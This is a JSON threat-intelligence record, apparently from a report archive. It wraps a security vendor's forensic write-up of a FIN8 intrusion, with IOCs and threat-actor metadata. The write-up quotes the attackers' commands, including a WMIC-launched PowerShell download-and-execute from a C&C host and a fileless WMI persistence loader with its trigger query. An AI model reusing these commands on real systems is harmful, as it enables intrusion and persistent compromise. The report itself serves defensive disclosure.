@@ -1,0 +1,113 @@
+{
+    "id": "a809b483-3b4a-4d9a-a4a1-47fbf0fe886a",
+    "created_at": "2023-01-12T15:10:49.776704Z",
+    "updated_at": "2025-03-27T02:09:43.019132Z",
+    "deleted_at": null,
+    "sha1_hash": "bfcd5a3be6f5fae741bb27beb918a54ddd779127",
+    "title": "2021-07-27 - Deep dive into a FIN8 attack – A forensic investigation",
+    "authors": "",
+    "file_creation_date": "2022-05-29T10:52:35Z",
+    "file_modification_date": "2022-05-29T10:52:35Z",
+    "file_size": 309345,
+    "plain_text": "# Deep dive into a FIN8 attack – A forensic investigation\n\n**[businessinsights.bitdefender.com/deep-dive-into-a-fin8-attack-a-forensic-investigation](https://businessinsights.bitdefender.com/deep-dive-into-a-fin8-attack-a-forensic-investigation)**\n\nBy **[Martin Zugec / Jul 27, 2021](https://businessinsights.bitdefender.com/author/martin-zugec)**\nDuring a recent investigation, our researchers encountered a new version of the BADHATCH malware used by the wellknown threat actor, FIN8. We [previously reported that FIN8 was working on a new version of the BADHATCH malware -](https://www.bitdefender.com/files/News/CaseStudies/study/394/Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf)\nand this recent attack supports our findings and conclusions. FIN8 is known for taking extended breaks to improve their\ntactics, techniques, and procedures (TTPs) which increases their success rate. With each new version of their toolkit, they\nstart with small tests on a limited pool of victims before launching a full-scale attack.\n\nOne of the best defensive tools the security community has is to openly share details about these early attacks to improve\nour defensive toolkits.\n\nThe objective of this blog post is to provide insights into an attempted attack by FIN8 on one of our customers, and how we\nworked with the customer to thwart the attack before it could fully develop. Through sharing forensic analysis of the attack,\nwe hope this threat intelligence can help other organizations targeted by FIN8.\n\n## FIN8’s Tried and True Methods\n\nFIN8 targets financial services and POS (point of sale) systems primarily through “living off the land” attacks – using built-in\ntools and interfaces (like PowerShell or WMI) and abusing legitimate services like sslip.io to disguise their activity. A\ncombination of preventive capabilities (to slow down attackers and generate early indicators) and detect & respond\ncapabilities is necessary to stop professional adversary groups such as FIN8.\n\n\n-----\n\n**NOTE: Prefixes are assigned to a threat group when a group is classified. Common prefixes are APT (Advanced Persistent**\n[Threat), FIN (Financially Motivated), or TEMP/TMP/UNC (Uncategorized). You can read more about this from MITRE.](https://attack.mitre.org/groups/)\nUnfortunately, there is no central authority for assigning names, so it is common for the adversary group to have many\nassigned aliases from different researchers.\n\n## Anatomy of an Attack\n\nWhile the initial infection vector remains unclear, based on previous attacks by this group, it is understood that FIN8 most\nlikely used social engineering techniques and spear-phishing campaigns for the initial compromise (read our analysis of\nFIN8 BADHATCH).\n\n### Network Reconnaissance\n\nWe know that at least two user accounts were compromised in the aforementioned attack. The first evidence of a\ncompromise was detected on one of the database servers. Once on the network, the attackers engaged in network\n**reconnaissance and retrieved a list of trusted domains and a list of domain controllers with the following commands:**\n\n```\nnltest.exe /domain_trusts\n\n```\n```\nnltest.exe /dclist:<domain>\n\n```\n\n### Lateral Movement\n\nAfter their initial reconnaissance, the malicious actors spread across the network expanding their foothold by, primarily,\ntargeting domain controllers. They engaged in lateral movement by using the WMIC utility for remote code execution (a\nbuilt-in Windows tool).\n```\nw mic.exe /node:<target> process call create \"cmd /c powershell.exe -nop -ep bypass -c\n$pw='b640a9c0e64704e1e202a07774613a29971fe5aa';$pa='sys';iex (New-Object\n\n```\n```\nSystem.Net.WebClient).DownloadString('https://104-168-237-21.sslip[.]io/134af6')\"\n\n```\n\nWMIC ( wmic.exe ) was used to create a remote command prompt instance ( cmd.exe ), which then executed the\nPowerShell code. The PowerShell command created two variables and attempted to download and execute the payload\nfrom one of FIN8’s Command and Control (C&C) servers. This download was blocked by Bitdefender – below description is\n[based on interpretation of variables discovered in our previous analysis of FIN8 operations.](https://www.bitdefender.com/files/News/CaseStudies/study/394/Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf)\n```\n   $pw – Probably password to decrypt the downloaded script file. Because download was blocked, we couldn’t\n\n```\nanalyze the script.\n\n`$pa` – Instructions for malicious framework to impersonate the lsass.exe/vmtoolsd.exe token and inject itself into a\nnew “svchost.exe -k netsvcs” process.\n\n\n-----\n\nFinally, command line tried to execute ( iex is an alias for `Invoke Expression ) the code downloaded from the IP`\naddress `104[.]168[.]237[.]21 . Threat actors abused sslip.io for connection to C&C - a service that provides free IP to`\ndomain mapping to make SSL certificate generation easier for traffic encryption. While this service is legitimate and widely\nused, the malware abused it in an attempt at evading detection when connecting to C&C servers.\n\nFor one of the machines, a slightly different URL was observed (ending with `/edaea0 ) with the identical` `$pw and` `$pa`\nvariables. The scripts downloaded from `sslip.io were unavailable at the time of this analysis as the server was down.`\n\nThis attempt was blocked by Bitdefender’s command line scanning capability. To avoid the command line scanning,\nattackers then switched the attack tool to `wmiexec.py from` [Impacket (a collection of Python classes to work with low-level](https://github.com/SecureAuthCorp/impacket)\naccess to packets and network protocols). This Python script connected directly to the target machine (without installing any\nservice/agent on the target machine) and used the valid credentials to execute the code.\n\n**NOTE: As a result of using wmiexec.py, the command lines we noticed on affected machines have specific output**\nredirection such as `\\ 1> \\\\127.0.0.1\\ADMIN$\\__1621898828.3311949 2>&1 .`\n\nAs is often the case with sophisticated adversaries, the attackers tried different methods to bypass the deployed security\ncontrols. Via trial and error, they were eventually able to take over some of the servers. One script used by the malicious\nactors, `C:\\Windows\\Temp\\rdp.ps1,was unavailable at the time of this analysis, and we believe it was an attempt to use`\nRDP tunneling (FIN8 has been known to use Plink for RDP tunneling).\n\n### Establishing Persistency\n\nAfter successful lateral movement, the attackers tried to establish persistency on selected servers –targeting all domain\ncontrollers, but also other servers. To achieve persistency, they used WMI Event Subscription with a few different WMI\nobjects.\n\nPersistency was established on servers using commands such as:\n```\ncmd.exe cmd.exe /Q /c powershell.exe -nop -ep bypass -c C:\\sldr.ps1 B4a0f3AE251b7689CFdDe1 1>\n\\\\127.0.0.1\\ADMIN$\\__1621898828.3311949 2>&1\n\n```\nThe script `sldr.ps1 contains an RC4 encrypted byte array and the first argument ( B4a0f3AE251b7689CFdDe1 ) is used`\nas a decryption key. The decrypted script is used to select a .NET binary based on the architecture type (x86 or x64), create\nWMI objects used for persistence (described later) and create a WMI event trigger. Three objects are created in WMI to\nsupport the persistency.\n\nThe first object ( root\\cimv2\\Win32_Base64Class ) has a property `Prop that contains the code of the payload. This is`\nused to store the payload in the WMI object.\n\nThe second object ( root\\subscription\\PerfData ) contains a command to retrieve and execute this payload. This is\nwhat is known as a fileless attack - the binary is loaded into memory and a static method `.StartCheck() is executed:`\n```\npowershell.exe -nop -c\n[System.Reflection.Assembly]::Load(([WmiClass]'root\\cimv2:Win32_Base64Class').Properties['Prop'].Value);\n[MSDAC.PerfOSChecker]::StartCheck()\n\n```\n\n-----\n\nFinally, the third object ( root\\subscription\\PerfOs ) handles persistency. It executes the previous PowerShell\ncommand when system uptime reaches a certain value (140 seconds after boot up of the system):\n```\nSELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA\n'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 140 AND\nTargetInstance.SystemUpTime < 240\n\n```\nThe entry point of the stored .NET code is the method `[MSDAC.PerfOSChecker]::StartCheck() . Once executed, it`\ndecrypts and executes a shellcode that downloads its next stage shellcode by contacting the following domains:\n```\n   api-cdn[.]net\n   git-api[.]com\n   api-cdnw5[.]net\n\n```\nAfter analyzing the shellcode, Bitdefender was able to download a DLL file that is used in the next stage of attack.\nDepending on the architecture, the shellcode downloads the\n```\n4e73e9a546e334f0aee8da7d191c56d25e6360ba7a79dc02fe93efbd41ff7aa4 file for the x64 version, and the\n05236172591d843b15987de2243ff1bfb41c7b959d7c917949a7533ed60aafd9 file for the x86 version.\n\n```\nThe downloaded DLL files represent an unknown piece of malware and the analysis of it is ongoing. So far, we know it is\nable to collect system information like computer name and volume information and it communicates with the same domains\nas the shellcode. These files are not detected by any AV product (per VirusTotal) at the time of discovery and have been\nsigned by Bitdefender in the meantime (see file hashes in the IOCs section below).\n\n## FIN8 Response Recommendations\n\nFIN8 typically targets the financial sector with a goal to compromise institutions and POS networks. In this attack,\nBitdefender was able to block a number of malicious actions, thus preventing the attack from fully developing. An important\n[element in this scenario was the expertise of the MDR team who quickly attributed the attack to a known adversary group](https://www.bitdefender.com/business/enterprise-products/managed-detection-response-service.html)\nand proactively worked with the customer to thwart the attempt.\n\nTo protect your business from attacks such as this in the future, separate your POS from the networks used by employees\n[or guests and monitor access to it. The combination of prevention tools with](https://www.bitdefender.com/oem/advanced-threat-intelligence.html) [detection and response tools are critical to help](https://www.bitdefender.com/business/enterprise-products/endpoint-detection-response.html)\nprotect your business. Remember, groups like FIN8 can stealthily infiltrate networks over many months, so regularly have\nyour security vendors validate their approach by staying on top of new threats in your industry.\n\n### Indicators of Compromise\n\nSpecific pre-execution detection for novel tools and artifacts of this attack have been added to Bitdefender products\n( Trojan.GenericKD.46463307, `Trojan.GenericKD.46463302,` `Trojan.GenericKD.37075281,`\n```\nTrojan.GenericKD.37075888 ). The malicious domains used in this attack were also blacklisted in our traffic scan\n\n```\nengine.\n\n**Domains**\n```\n api-cdn[.]net\n git-api[.]com\n api-cdnw5[.]net\n 104-168-237-21.sslip[.]io\n\n```\n**URLs**\n\n\n-----\n\n```\nhttps://104-168-237-21.sslip[.]io/134af6\n\n```\n\n**SHA256**\n```\n ede6ca7c3c3aedeb70e8504e1df70988263aab60ac664d03995bce645dff0935\n 5b8b732d0bb708aa51ac7f8a4ff5ca5ea99a84112b8b22d13674da7a8ca18c28\n 4e73e9a546e334f0aee8da7d191c56d25e6360ba7a79dc02fe93efbd41ff7aa4\n 05236172591d843b15987de2243ff1bfb41c7b959d7c917949a7533ed60aafd9\n edfd3ae4def3ddffb37bad3424eb73c17e156ba5f63fd1d651df2f5b8e34a6c7\n\n```\n**File Names and Locations**\n```\n C:\\Windows\\Temp\\sldr.ps1\n C:\\Windows\\Temp\\s.ps1\n C:\\sldr.ps1\n C:\\Users\\Public\\s.ps1\n\n```\n_We would like to thank Dragos Teodor Gavrilut, Victor Vrabie,_ _Cristina Vatamanu and Bogdan “Bob” Botezatu for their help_\n_with putting this report together._\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-27 - Deep dive into a FIN8 attack – A forensic investigation.pdf"
+    ],
+    "report_names": [
+        "2021-07-27 - Deep dive into a FIN8 attack – A forensic investigation.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "72d09c17-e33e-4c2f-95db-f204848cc797",
+            "created_at": "2022-10-25T15:50:23.832551Z",
+            "updated_at": "2025-03-27T02:00:55.554841Z",
+            "deleted_at": null,
+            "main_name": "FIN8",
+            "aliases": [
+                "FIN8",
+                "Syssphinx"
+            ],
+            "source_name": "MITRE:FIN8",
+            "tools": [
+                "BADHATCH",
+                "PUNCHBUGGY",
+                "Ragnar Locker",
+                "PUNCHTRACK",
+                "dsquery",
+                "Nltest",
+                "Sardonic",
+                "PsExec",
+                "Impacket"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "fc80a724-e567-457c-82bb-70147435e129",
+            "created_at": "2022-10-25T16:07:23.624289Z",
+            "updated_at": "2025-03-27T02:02:09.892602Z",
+            "deleted_at": null,
+            "main_name": "FIN8",
+            "aliases": [
+                "ATK 113",
+                "Syssphinx"
+            ],
+            "source_name": "ETDA:FIN8",
+            "tools": [
+                "ALPHV",
+                "ALPHVM",
+                "BadHatch",
+                "BlackCat",
+                "Noberus",
+                "PSVC",
+                "PUNCHTRACK",
+                "PoSlurp",
+                "Powersniff",
+                "PunchBuggy",
+                "Ragnar Locker",
+                "RagnarLocker",
+                "Sardonic",
+                "ShellTea"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "5bdde906-0416-42ee-9100-5ebd95dda77a",
+            "created_at": "2023-01-06T13:46:38.601977Z",
+            "updated_at": "2025-03-27T02:00:02.870694Z",
+            "deleted_at": null,
+            "main_name": "FIN8",
+            "aliases": [
+                "ATK113",
+                "G0061"
+            ],
+            "source_name": "MISPGALAXY:FIN8",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673536249,
+    "ts_updated_at": 1743041383,
+    "ts_creation_date": 1653821555,
+    "ts_modification_date": 1653821555,
+    "files": {
+        "pdf": "https://archive.orkl.eu/bfcd5a3be6f5fae741bb27beb918a54ddd779127.pdf",
+        "text": "https://archive.orkl.eu/bfcd5a3be6f5fae741bb27beb918a54ddd779127.txt",
+        "img": "https://archive.orkl.eu/bfcd5a3be6f5fae741bb27beb918a54ddd779127.jpg"
+    }
+}
